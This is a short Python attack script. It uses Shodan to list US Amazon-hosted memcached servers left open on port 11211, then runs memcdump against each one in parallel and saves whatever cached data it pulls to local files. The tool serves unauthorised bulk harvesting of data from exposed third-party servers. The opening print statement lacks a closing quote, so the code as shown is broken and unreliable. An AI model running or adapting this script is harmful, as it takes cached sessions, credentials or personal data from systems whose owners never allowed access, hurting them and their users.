import os
from multiprocessing import Process
import sys
print("python3 amazonmemcache.py filename)
os.popen("shodan download --limit -1 "+sys.argv[1]+"mem.json.gz \"port:11211 \'STAT pid\' org:\'amazon\' country:\'US\'\"").read()
ips = os.popen("shodan parse --fields ip_str "+sys.argv[1]+"mem.json.gz").read()
def task(i):
    ip = ips.splitlines()
    this = os.popen("memcdump --servers="+ip[i]).read()
    if this:
        with open(ip[i].strip()+".txt", 'w') as filed:
            print(this, file=filed)
            filed.close()
    else:
        print("ip : "+ip[i]+" is empty ", end="\r")

if __name__ == '__main__':
    processes=[Process(target=task, args=(n,)) for n in range(len(ips.splitlines()))]
    for process in processes:
        process.start()
    for process in processes:
        process.join()
        
